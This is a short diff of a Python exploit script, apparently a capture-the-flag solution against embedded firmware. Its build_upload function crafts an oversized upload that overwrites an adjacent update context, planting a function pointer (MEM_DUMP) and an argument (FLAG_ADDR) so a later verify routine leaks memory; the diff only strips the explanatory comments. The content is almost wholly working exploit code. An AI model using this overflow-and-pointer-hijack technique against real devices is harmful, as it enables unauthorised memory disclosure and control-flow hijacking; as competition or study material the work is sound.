@@ -269,18 +269,12 @@ def pkt(cmd, data=b""):
 
 def build_upload():
     data = bytearray(b"A" * UPLOAD_DATA_LEN)
-
-    # The upload buffer starts at 0x20008000 and overlaps the update context at
-    # 0x200081e0 when we send 0x1f8 bytes. VERIFY later calls:
-    #   ((fn_ptr)arg0, len)
-    # from the overwritten context.
-    data[0x1E0:0x1E4] = struct.pack("<I", FLAG_ADDR)   # arg0
-    data[0x1E4:0x1E8] = struct.pack("<I", 0)           # uploaded_chunks
-    data[0x1E8:0x1EC] = struct.pack("<I", 1)           # total_chunks
-    data[0x1EC:0x1F0] = struct.pack("<I", 0)           # current_offset
-    data[0x1F0:0x1F4] = struct.pack("<I", 0)           # state, clobbered later
-    data[0x1F4:0x1F8] = struct.pack("<I", MEM_DUMP)    # thumb function pointer
-
+    data[0x1E0:0x1E4] = struct.pack("<I", FLAG_ADDR)   
+    data[0x1E4:0x1E8] = struct.pack("<I", 0)           
+    data[0x1E8:0x1EC] = struct.pack("<I", 1)           
+    data[0x1EC:0x1F0] = struct.pack("<I", 0)           
+    data[0x1F0:0x1F4] = struct.pack("<I", 0)         
+    data[0x1F4:0x1F8] = struct.pack("<I", MEM_DUMP)    
     return struct.pack(">HH", 0, 1) + data
 
 
